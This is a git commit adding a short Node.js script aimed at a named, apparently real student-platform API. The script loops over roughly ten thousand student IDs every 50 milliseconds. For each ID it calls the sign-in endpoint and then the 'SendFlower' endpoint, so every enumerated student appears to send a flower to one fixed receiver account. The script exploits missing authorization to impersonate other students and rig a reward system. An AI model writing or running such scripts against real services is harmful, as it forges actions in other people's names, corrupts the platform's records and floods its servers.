a15d6f2c91f4b6cb1e3d8bd50b61132200e53eb4
HESYlaowang <2705542113@qq.com>
2023-05-13 17:38:03 +0800

    Create index.js

---
+++ index.js
@@ -0,0 +1,39 @@
+const https = require('https');
+
+const signUrl = id => `https://studentapi.lyced.com//student/Sign?StudentId=${id}`
+const flowerUrl = id => `https://studentapi.lyced.com//student/SendFlower?Sender=${id}&Receiver=1194114&FlowerCount=1`
+
+let id = 1000;
+
+function send(i) {
+    if (i > 11000) {
+        throw new Error('sss')
+    }
+    https.get(signUrl(id), res => {
+         let data = '';
+        // called when a data chunk is received.
+        res.on('data', (chunk) => {
+           data += chunk;
+        });
+       // called when the complete response is received.
+        res.on('end', () => {
+            const v = JSON.parse(data)
+            console.log('sign', id, v)
+            https.get(flowerUrl(id), res => {
+            let data = '';
+                // called when a data chunk is received.
+                res.on('data', (chunk) => {
+                 data += chunk;
+                });
+             // called when the complete response is received.
+              res.on('end', () => {
+                    const v = JSON.parse(data)
+                   console.log('flwr', id, v)
+            });
+    });
+        });
+    });
+    
+}
+
+setInterval(() => send(id++), 50)
